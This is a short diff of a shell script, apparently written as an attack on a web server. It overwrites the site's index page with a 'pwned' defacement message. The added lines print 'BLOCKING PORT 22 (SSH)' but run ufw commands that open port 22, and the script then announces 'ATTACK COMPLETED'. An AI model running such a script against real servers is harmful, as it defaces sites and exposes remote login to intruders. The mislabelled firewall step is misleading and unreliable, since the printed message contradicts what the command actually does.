@@ -67,3 +67,14 @@ echo "<body><h1>W3lc0m3 t0 j4ck's W3bs1t3</h1>" >> /var/www/html/index.html
 echo "<p>This website has been pwned by 3^*#@dsa32</P></html>" >> /var/www/html/kindex.html
 
 echo "----------------------------------WEBPAGE DISMEMBERED-------------------------------"
+
+sleep 1
+echo "------------------------------BLOCKING PORT 22 (SSH)----------------------------"
+
+echo ""
+ufw allow 22/tcp
+ufw allow 22/udp
+sleep 2
+echo "-----------------------------------DONE------------------------------------------"
+
+echo "----------------------------------ATTACK COMPLETED---------------------------------"
